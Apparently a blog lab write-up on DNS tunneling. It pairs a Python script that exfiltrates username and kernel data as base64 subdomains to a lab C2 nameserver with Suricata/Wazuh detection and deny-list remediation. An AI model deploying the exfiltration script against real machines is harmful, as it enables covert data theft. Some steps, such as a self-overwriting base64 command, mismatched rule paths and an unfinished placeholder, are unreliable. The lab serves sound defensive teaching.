---
title: DNS Tunneling
date: 2025-06-18
draft: false
author: Alex Jenkins
---
| Category      | ID        | Description       |
| ------------- | --------- | ----------------- |
| Tactic        | TA0011     | Command and Control |
| Techniques     | T1071, T1132     | Application Layer Protocol, Data Encoding  |
| Sub-Techniques | T1071.004, T1132.001 | DNS, Standard Encoding |

<!--more-->

## Introduction
The Domain Name System (DNS) is a common Application Layer protocol that communicates over port 53. Many organisations will allow traffic over this protocol because it is essential for translating domain names into IP addresses. Adversaries may use this to their advantage and communicate with their Command and Control (C2) servers over this commonly-used protocol, blending in with normal traffic.  

In today's lab I will be demonstrating my own take on this issue, showcasing one way in which an adversary may exfiltrate data using DNS queries. It walks through the configuration of an infected machine, DNS server, gateway, and includes scripts that demonstrate how adversaries might extract, encode and transmit data. The lab concludes with a blue team investigation into detection and remediation strategies.

Though the main technique explored in this lab is `T1071.004`, there is a slight crossover with `T1132.001`. This is because domain queries made over the DNS protocol can fail if any obscure characters exist, therefore all exfiltrated data from the infected machine is encoded with base64 first. This isn't a direct demonstration of the technique itself, but rather a necessary caveat of my chosen extraction method. In this case, the infected machine refers to the system hosting malware, which extracts system information and exfiltrates it to a malicious DNS server.

## Configuration
For this configuration I am using Ubuntu Server 24.04.2 LTS for the C2 server and gateway, and Arch Linux for the infected machine. You don't need to use Arch for your infected machine, you can use whatever Linux distribution you're comfortable with. I recommend Ubuntu Server for the C2 server because it offers easy-to-install DNS software from the package repository, and is very beginner friendly.

During this configuration I will expect you to have some experience working with Virtual Machines (VMs). This is important because I will not be going into specifics of how to configure the VM. You will be responsible for managing your own virtual hardware and resource allocation.

My servers and hosts are setup as VMs using VirtualBox. I've decided on this purely because it works well on Linux, and because it's software that I'm familiar with. Use whatever virtualization technology you're comfortable with to setup your three VMs, then continue reading to configure the DNS.

### C2 Server
All we're going to be installing on this is a DNS service. To start, make sure you download `bind9` and `dnsutils`. `bind9` is what we will be using as the nameserver, and `dnsutils` gives us some common DNS troubleshooting tools like `nslookup`. Install these with the following command:
```
sudo apt-get install bind9 dnsutils
```

I will be covering all the steps required to get this up and running, but I would encourage you to read [Ubuntu's documentation](https://documentation.ubuntu.com/server/how-to/networking/install-dns/index.html) on setting up a DNS server because it's much more comprehensive than mine. It's also a very good place to start if you're a beginner and have never setup a DNS server before.

To setup the forward lookup zone you need to modify `/etc/bind/named.conf.local`. You'll change this to use whatever FQDN you want, I've gone with the very creative `homelab.local`, then list it as type _master_ and point it to your new file. This tells the DNS where to look for your forward zone configurations.
```
zone "homelab.local" {
  type master;
  file "/etc/bind/db.homelab.local";
};
```

The next logical step should then be to make the forward zone file. To do that just copy an existing zone file as a template for editing, matching the file path you used in `named.conf.local`.
```
sudo cp /etc/bind/db.local /etc/bind/db.homelab.local
```

Now you want to open that file in a text editor and make some changes. You can copy my file, just make sure you change it to reflect the correct domain and IP address for your nameserver.  
> Important: The serial number needs to be incremented any time you make a change to this file.
```
;
; BIND data file for local loopback interface
;
$TTL    604800
@       IN      SOA     homelab.local. root.homelab.local. (
                              2         ; Serial
                         604800         ; Refresh
                          86400         ; Retry
                        2419200         ; Expire
                         604800 )       ; Negative Cache TTL
;
@       IN      NS      homelab.local.
@       IN      A       192.168.1.155      
```

That's all you need to do to make a working DNS, but we need to go one step further and enable logging. Enabling logs will allow us to capture queries from the infected machine and save them for processing. This file doesn't have any system-specific content so feel free to just copy and paste it if you want. Pop these changes into `/etc/bind/named.conf`:
```
include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";

logging {
        channel query.log {
                file "/var/log/named/query.log";
        };
        category queries { query.log; };
};
```

Now, let's finish setting up the logging system and restart services to apply changes. Run these commands to make the new directory for the logs to live in, change the ownership to bind (the user which the _named daemon_ runs as), restart the service to apply any changes, and start listening for logs.
```
sudo mkdir /var/log/named
sudo chown bind:bind /var/log/named
sudo systemctl restart bind9
sudo tail -f /var/log/named/query.log
```

On a separate machine, use the `nslookup` tool from the `dnsutils` suite to query your newly configured domain and verify functionality. Feel free to use the infected machine for this, just make sure it's configured to use your new DNS (see the next section to learn how to do this). There's a snippet of both the command I used and the output below. If you've followed the steps correctly you will see the domain name and its resolved IP address.

```
[alex@extarch c2-projects]$ nslookup homelab.local
Server:		192.168.1.155
Address:	192.168.1.155#53

Name:	homelab.local
Address: 192.168.1.155
```

This command serves two purposes: 

1. Verify that the domain resolves correctly
2. Create a log entry on the server

The server, still running `tail`, will print a log entry for that query that should look similar to the following snippet:
```
client @0x77042c1ca578 192.168.1.182#36083 (homelab.local): query: homelab.local IN A + (192.168.1.155)
```

### Gateway
The gateway manages two networks; a host-only network shared between itself and internal devices, and an external network designed to enable internet access to itself and others using the host-only network. Having the traffic flow through the gateway allows you to filter through it before it gets forwarded, offering you the ability to write detection rules and make risk-based decisions. Based on this definition, this server is a multi-purpose all-in-one firewall, router and gateway.

Using your chosen VM software, assign two Network Interface Cards (NICs) to the gateway server. One of those needs to be host-only to keep the network isolated, the other needs to have internet access. The second adapter will be entirely dependent on your setup, mine needs a bridged adapter but in the most scenarios a NAT adapter will work just fine. If you make the internet-facing adapter first it should work out-of-the-box, needing no prior configuration.

To begin, type `ip addr` into your terminal to see your network devices. You should see two NICs, one of which will be down (example below), this will be your host-only adapter. You should also try to `ping google.com` to make sure you have a working internet connection. If not, set that up first before you continue reading.
```
3: enp0s8: <BROADCAST,MULTICAST> mtu 1500 qdisc fq_codel state DOWN group default qlen 1000
    link/ether 08:00:27:7d:98:82 brd ff:ff:ff:ff:ff:ff
```

Use the `ip` command to enable this interface, and assign it a new IP address.
> Make sure you change the name of the network interface and the IP address to fit your requirements.
```
sudo ip link set enp0s8 up
ip addr add 192.168.56.10/24 dev enp0s8
```

If you run `ip addr` again you should see that your adapter now is now _UP_, and has the IP address you assigned.
```
3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:7d:98:82 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global enp0s8
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fe7d:9882/64 scope link 
       valid_lft forever preferred_lft forever
```

The interface is now up and has an assigned address, but you still won't be able to access the internet from your other device. To do that you need to start forwarding traffic.
```
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o enp0s3 -j MASQUERADE
sudo iptables -A FORWARD -i enp0s8 -o enp0s3 -j ACCEPT
sudo iptables -A FORWARD -i enp0s3 -o enp0s8 -m state --state RELATED,ESTABLISHED -j ACCEPT
```
I'll explain these commands in the order they're written:

1. Tells the Linux kernel to foward IP packets between network interfaces, allowing the machine to function as a gateway. In doing this you should be able to `ping` any device your gateway can see in the network.
2. Sets up source NAT (masquerading) on outbound packets through `enp0s3`, replacing internal source IPs with the external interface's IP - allowing any device behind the firewall to access the internet through that single public-facing IP.
3. Allows forwarding of packets coming from the internal network interface (`enp0s8`) going out to the internet via `enp0s3`.
4. Allows return traffic from the internet (on `enp0s3`) to reach internal devices (on `enp0s8`), but only if the connection was initiated from the inside - thanks to connection tracking (`--state RELATED,ESTABLISHED`).

The final step is to add a new entry to `/etc/resolv.conf`. Doing this simulates real-world DNS connection by adding the C2 server to the list of recognised nameservers. In other words you'll be telling the machine to treat the C2 server as its own DNS, enabling IP resolution whilst keeping it isolated to your private network. In real-world scenarios this wouldn't be required because the domain would be internet facing and resolved by a public DNS provider.
```
nameserver 192.168.1.155 # Change this to the IP of your DNS server
```

Everything done on the gateway up until this point has enabled two-way communication with the infected machine, and established the C2 server as a recognised DNS resolver. The next steps will setup a sensor to monitor and detect suspicious network activity and forward that activity to Wazuh.

#### Suricata
Suricata is an open-source Intrusion Detection System (IDS) and Intrusion Prevention System (IPS). It's great for monitoring network traffic and is a minimal effort install for Ubuntu server. It can get quite expensive on resources if you're building a high volume network, but for a lab environment it should be fine to run it with around 2 CPU cores and 4GB RAM. We'll be following Suricata's official [installation documentation](https://docs.suricata.io/en/latest/quickstart.html#installation) during this setup, which begins with the following commands:
```
sudo apt-get install software-properties-common
sudo add-apt-repository ppa:oisf/suricata-stable
sudo apt update
sudo apt install suricata
```

After running those four commands Suricata should be installed and running. Verify this with `sudo systemctl status suricata`. We want Suricata to monitor traffic over the host-only interface that we configured earlier. Double check your adapter's name with `ip addr` if you need to, then modify `/etc/suricata/suricata.yaml`. Look for the `af-packet` section and change the interface to the one you want to monitor. In my case this is `enp0s8`. You also want to find the `eve-log` section and enable DNS like so:
```
- eve-log:
    enabled: yes
    filetype: regular
    filename: eve.json
    types:
      - dns:
          enabled: yes
```

With that change any DNS queries made will be logged in `/var/log/suricata/eve.json`.

This next part isn't really necessary for this lab but it may come in handy in the future. If your system is outdated you need to upgrade it first to avoid errors (learn from my mistakes), then run `suricata-update` to enable all the signatures. Signatures in Suricata are basically rules that define patterns in network traffic and doing this activates all the pre-defined rules.
```
sudo apt upgrade
sudo suricata-update
```

#### Wazuh
With suricata setup the final step is to ingest the eve logs into Wazuh. You can do that by modifying the agent config file and adding a new `localfile` section to `ossec_config` in `/var/ossec/etc/ossec.conf`.
```
<localfile>
  <log_format>json</log_format>
  <location>/var/log/suricata/eve.json></location>
</localfile>
```

Restart the wazuh agent after making those changes.
```
sudo systemctl restart wazuh-agent
```

### Infected Machine

The infected machine doesn't need much in terms of configuration, we just need to setup the host-only network to start routing traffic through our gateway and get internet access. Figure out what your network card's name is using `ip addr` then do the following:
> Make sure you change the name of the network interface and the IP address to fit your requirements.

```
sudo ip link set enp0s3 up
sudo ip addr add 192.168.56.11/24 dev enp0s3
sudo ip route add default via 192.168.56.10
```

By running those three commands you've effectively activated the NIC, assigned an IP address to it, and told it to route traffic through the gateway.

The final step for this machine is to change the nameserver in `/etc/resolv.conf` to that of your gateway. 
```
nameserver 192.168.56.10 # Change this to the IP of your gateway
```

## Red Team
With configuration finished the red team engagement can commence. For this part we assume that the adversary has already managed to get malware onto the victim's machine, and it is now infected. This malware was created specifically for this lab, is written in Python, and is provided in the next code block.

I've named this malware `dns_tunneling.py` and its sole purpose is to extract information from the infected machine and exfiltrate it over DNS to the C2 server. That might sound complicated, but it's quite easy when you break it down into steps:

1. Collect the data using built-in linux commands via `subprocess`
2. Encode it with base64 for seamless transportation
3. Clean the data and strip unnecessary characters
4. Query the C2 DNS server with the encoded data

Encoding with base64 is required because DNS operates with a strict set of character limitations. This means that certain special characters like spaces, slashes and non-ASCII symbols could break the query entirely. When you encode this data with base64 you're essentially sanitizing the data so that it doesn't interfere with the query's structure.

Please note the DNS toolkit used in this malware is not installed by default. `subprocess` and `base64` will be included with a typical Python install but you will need to install `dnspython` to get the exfiltration section to work. You can do this by running `pip install dnspython`. Note that this likely won't work and you'll have to use your chosen distribution's package manager to install this, or setup a virtual environment with Python. I went with the package option and ran `sudo pacman -S python-dnspython`.

``` python
def base64_encode(data):
    # base64 encoding requires input data as bytes
    if not isinstance(data, bytes):
       data = data.encode("utf-8")
    data = base64.b64encode(data)
    return data.decode("utf-8").strip()

def run_command(commands):
    # process commands and return stdout as bytes
    return subprocess.run(commands, capture_output=True).stdout

# Extract
import subprocess
raw_username = run_command("whoami")
raw_system_info = run_command(["uname", "-r"])

# Encode
import base64
encoded_username = base64_encode(raw_username)
encoded_system_info = base64_encode(raw_system_info)

# Exfiltrate
import dns.resolver
domain = ".homelab.local" # change this to suit your needs
encoded_message = f"{encoded_username}.{encoded_system_info}" + domain
try:
    dns.resolver.resolve(encoded_message, 'TXT')
except:
    # pass to ignore errors when resolving domains
    # -- errors will occur because the domains are non-existent
    pass
```

When the script above is run your C2 server should receive a log that looks similar to this:
```
client @0x77042c1ca578 192.168.1.182#55499 (YWxleAo=.Ni4xNC4xMC1hcmNoMS0xCg==.homelab.local): query: YWxleAo=.Ni4xNC4xMC1hcmNoMS0xCg==.homelab.local IN TXT +E(0) (192.168.1.155)
```

Notice how the query contains two obfuscated strings; `YWxleAo=` and `Ni4xNC4xMC1hcmNoMS0xCg==`. What we've done here is queried `homelab.local` but included the exfiltrated and encoded data as two additional subdomains. In doing this the C2 server has managed to log the query despite the fact that the domain does not exist. This is exactly how we will harness this exfiltration technique - we just need to make a listener that can decode the logs for us.

``` python
import re
import time
import base64

dns_log_file = "/var/log/named/query.log"

with open(dns_log_file, "r") as file:
    file.seek(0,2) # move to end of file
    while True:
        message = []
        line = file.readline()
        if line:
            line = line.strip()
            match = re.search(r'query: ([^\s]+)', line)
            if match:
                query = match.group(1)
                split_query = query.split('.')
                for section in split_query:
                    if section == "homelab" or section == "local":
                        pass
                    else:
                        decoded_section = base64.b64decode(section).decode("utf-8").strip()
                        message.append(decoded_section)
        if message:
            print(" ".join(message))
        time.sleep(1)
```

`dns_listener.py` is designed to listen to the DNS log file for any updates, refreshing every second. You may have noticed that this is a very basic example and isn't very fault-tolerant. It will quickly strip out the query within the DNS record, split that query into sections by periods, and decode those sections if they don't match one of two keywords; homelab and local. Make sure to adapt those keywords to fit your setup if you're following along or you will have errors. A more robust approach would be to verify whether each section is actually base64-encoded rather than excluding specific keywords. However, this works perfectly fine for this lab exercise.

It's important to note that the malware on your infected machine will gather user and system information which will be different from mine. In other words, my example output will look much different to yours because you will have chosen your own username and operating system. That said, if all steps were followed correctly, the listener will have successfully decoded the DNS query and output the infected machine's details in plaintext:
```
alex@c2-server:~$ python3 dns_listener.py 
alex 6.14.10-arch1-1
```

With that you've had a basic example of how an adversary might exfiltrate data via the DNS protocol. The example I've given is the first step of communication, where the server has now received information which it can use to identify the infected machine. In future communications the infected machine could prefix messages with this information so that the C2 server may recognise the source of the data.

## Blue Team
Let's pretend we're a sysadmin for a moment and have decided to take a look at some of the network traffic. We load up `tshark` (the command-line version of WireShark) and spot this:
```
   25 3.127105183 192.168.1.182 → 8.8.8.8      DNS 118 Standard query 0xe83a TXT YWxleAo=.Ni4xNC4xMC1hcmNoMS0xCg==.homelab.local OPT
   26 3.137087890      8.8.8.8 → 192.168.1.182 DNS 193 Standard query response 0xe83a No such name TXT YWxleAo=.Ni4xNC4xMC1hcmNoMS0xCg==.homelab.local SOA a.root-servers.net OPT
```

That's weird... I don't know that domain, and those subdomains look suspicious. Normally we could use some Open-Source Intelligence (OSINT) to checkout the domain and get some juicy details on a malicious network, but our DNS is private so we can't do that. Instead, we take a deeper look at those subdomains... are they encoded?
```
root@homelab-firewall:/home/alex# echo "YWxleAo=" | base64 -d
alex
root@homelab-firewall:/home/alex# echo "Ni4xNS4yLWFyY2gxLTEK" | base64 -d
6.15.2-arch1-1
```

Who's Alex? And is that version information for a computer? You login to one of your managed hosts and sure enough, it's one of your machines:
```
[root@infected-machine alex]# cat /etc/passwd | grep alex
alex:x:1000:1000::/home/alex:/usr/bin/bash
[root@infected-machine alex]# uname -a
Linux infected-machine 6.15.2-arch1-1 #1 SMP PREEMPT_DYNAMIC Tue, 10 Jun 2025 21:32:33 +0000 x86_64 GNU/Linux
```

### Detection
The order of this is a bit backwards, normally we'd remediate first given the severity of the situation. But because we want to write and test detection rules, we're going to do it in the reverse order - otherwise it would already be blocked and it just causes unnecessary hassle. We're going to be using Suricata to ingest a log into Wazuh. Assuming you followed the configuration steps, any time we run `dns_tunneling.py` Suricata will log the request in `/var/log/suricata/eve.json`. It should look something like:
```
"timestamp":"2025-06-17T10:47:15.623780+0000",
"flow_id":943919941105773,
"in_iface":"enp0s8",
"event_type":"dns",
"src_ip":"192.168.56.11",
"src_port":57476,
"dest_ip":"192.168.56.10",
"dest_port":53,
"proto":"UDP",
"pkt_src":"wire/pcap",
"dns": {
  "version":2,
  "type":"answer",
  "id":48108,
  "flags":"8183",
  "qr":true,
  "rd":true,
  "ra":true,
  "opcode":0,
  "rrname":"YWxleAo=.Ni4xNS4yLWFyY2gxLTEK.homelab.local",
  "rrtype":"TXT",
  "rcode":"NXDOMAIN",
  "authorities": [{
    "rrname":"",
    "rrtype":"SOA",
    "ttl":86399,
    "soa": {
      "mname":"a.root-servers.net",
      "rname":"nstld.verisign-grs.com",
      "serial":2025061700,
      "refresh":1800,
      "retry":900,"expire":604800,"minimum":86400
    }
  }]
}
```

This is perfect for writing a detection rule in Wazuh. At the moment this sort of thing isn't generating any alerts in the dashboard but we can change that by add the new rule to `/var/ossec/etc/rules/local_rules.xml`.
```
<group name="suricata,dns">
    <rule id="100001" level="7">
      <if_sid>86603</if_sid>
      <field name="dns.rrtype">TXT</field>
      <description>Custom DNS TXT rule chained from Suricata base rule</description>
    </rule>
</group>
```
If there's any template data here, delete it before adding those changes. This new rule essentially overrides the default suricata rule in Wazuh (86603) if it finds a `dns.rrtype` of TXT. Choose your own rule id that doesn't conflict with any others (usually custom rules are between 100000 and 120000), and whatever description you want. I've gone with level  7 for this which indicates a "bad word" matching as per [Wazuh's docs](https://documentation.wazuh.com/current/user-manual/ruleset/rules/rules-classification.html). Restart your `wazuh-manager` when you're finished writing your new rule and you should start to see the malware's DNS queries appearing in your Wazuh alerts.
```
sudo systemctl restart wazuh-manager
```

I would recommend setting up a monitor to alert you if this activity happens again. To do that, in Wazuh go to `Explore -> Alerting` and click the `Create monitor` button. I've detailed my setup in the table below, if a setting is not mentioned I kept it as default.

| Setting | Value |
|---|---|
| Monitor Name | Suspicious DNS Activity |
| Run every | 1 Hours |
| Indexes | * |
| Time field | timestamp |
| Data filter | data.dns.rrtype is TXT |

Run your `dns_tunneling.py` script one more time and you should see an alert popup when the run job cycles.

### Remediation
From the information found by our lovely sysadmin we can determine that a DNS TXT query was made to `YWxleAo=.Ni4xNC4xMC1hcmNoMS0xCg==.homelab.local` and the subdomain is encoded information from a local machine. Normally there would be a full investigation to figure out where the requests are coming from, which would lead to the discovery of the malware, but in this case (because we're focusing on DNS tunneling) we're going to try to stop the tunneling at the network level.

[MITRE](https://attack.mitre.org/techniques/T1071/004/) suggests mitigation by either filtering the network traffic or setting up some means of network intrusion prevention. Network filtering typically looks for DNS requests to unknown, untrusted or bad domains, whereas the alternative looks for network signatures. The trouble with this is writing a rule to match base64 signatures is difficult because Suricata and Wazuh don't offer many options beyond regex. And because base64 is essentially just a string of safe characters, regex queries match on almost every other word including homelab and local. For this reason, the only real viable option is network filtering.

The best and most secure way to block any unwanted domains is to use an allow list. An allow list basically acts as a whitelist and is a file with a long list of domains which your firewall would consider safe to visit. The issue with that is every organization has their own definition of what a _safe_ domain is, which means they are not readily available and we would need to build an allow list from scratch. That is a viable option but it would be very time consuming and I don't know all my regular domains from the top of my head. In this case the better option is to begin with a deny list (which is the opposite of an allow list) and build an allow list on the side as you begin to discover domains that are suitable for you. Deny lists, AKA blocklists, are prevalent throughout the internet and many threat intelligence feeds provide regular updates to those lists. That makes this a quick and easy solution to blocking all the **known** malicious domains.

We're going to configure suricata to use our deny list, utilizing its IPS functionality. There is already a `dns-events.rules` file for Suricata, but we can't use this because it's actively maintained and our changes might get overwritten. Instead, let's make our own file called `/var/lib/suricata/rules/local.rules`.
```
alert dns any any -> any any (
  msg:"Malicious DNS Query";
  dns.query;
  dataset:isset,mal_domains,type string,load /etc/suricata/rules/malicious_domains.lst,memcap 10mb,hashsize 1024;
  classtype:trojan-activity;
  sid:1000001;
  rev:1;
)
```

Then you need to enable the rule in `/etc/suricata/suricata.yaml`. Find the `rule-files` section and add an entry for `local.rules`.

```
rules-files:
  - local.rules
```

Then restart Suricata to apply the changes.
```
sudo systemctl restart suricata
```

Make a deny list in the same location called `/var/lib/suricata/rules/malicious_domains.lst`. For now just put on entry in there `homelab.local`. Then you need to base64 encode it for it to be readable by your new rule.
```
base64 /var/lib/suricata/rules/malicious_domains.lst > /var/lib/suricata/rules/malicious_domains.lst
```

If you noticed earlier, a key term used when describing a deny list was _known malicious domains_. `homelab.local` is not a known malicious domain to the average person. So what we need to do, for this domain and any future domains we encounter that aren't included in any deny lists, is add a manual entry.

- show manual entry

# Conclusion
In conclusion, DNS tunneling is a technique used to blend C2 communications with normal application layer traffic in an attempt to remain undetected. The method covered in this lab showcased data exfiltration via DNS queries, where the information was encoded and prefixed as subdomains. The detection of this type of exfiltration proves to be difficult because base64 strings, when matched with regular expressions, are too similar to normal domains. We observed that the queries made were searching for TXT records, a technique whereby a machine tries to resolve a domain name, which we included in a detection rule. When the domain query reached the C2 server, a listener decoded the subdomains and extracted the user and system info. To mitigate this issue a deny list was implemented with a manual entry for `homelab.local`.

During this lab we learned how to configure a DNS server, install a multi-purpose gateway and firewall system, and setup an infected host machine. The malware and listener used by the red team were custom-made for this exercise using Python. Our blue team discovered the suspicious domain queries using `tshark`, wrote detection rules in Wazuh after ingesting logs with Suricata, and remediated the threat using network filtering as recommended by the MITRE ATT&CK framework.
